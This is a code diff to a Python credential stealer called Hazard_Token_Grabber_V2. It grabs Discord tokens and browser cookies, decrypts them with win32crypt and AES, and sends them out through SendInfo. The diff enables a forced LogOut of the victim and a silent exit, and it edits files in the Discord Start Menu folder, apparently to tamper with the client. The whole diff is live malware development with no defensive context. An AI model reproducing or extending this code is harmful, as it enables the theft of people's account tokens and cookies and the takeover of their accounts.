@@ -1,4 +1,4 @@
-import requests, os, string, random, win32crypt, shutil, sqlite3, datetime, zipfile, json, base64, psutil
+import requests, os, string, random, win32crypt, shutil, sqlite3, zipfile, json, base64, psutil
 from re import findall
 from Crypto.Cipher import AES
 
@@ -13,8 +13,8 @@ class Hazard_Token_Grabber_V2:
         try:
             os.mkdir(os.path.join(self.tempfolder))
         except:
-            # os._exit(0)
-            pass
+            os._exit(0)
+            # pass
 
         self.tokens = []
 
@@ -22,7 +22,7 @@ class Hazard_Token_Grabber_V2:
         self.grabCookies()
         self.grabTokens()
         self.SendInfo()
-        # self.LogOut()
+        self.LogOut()
 
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
@@ -53,7 +53,7 @@ class Hazard_Token_Grabber_V2:
                         with open(directory_list, 'w'): pass
                         with open(directory_list, 'r+') as index_file3:
                             index_file3.write(replace_string)
-                    except Exception:
+                    except FileNotFoundError:
                         pass
         for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
             for name in files:
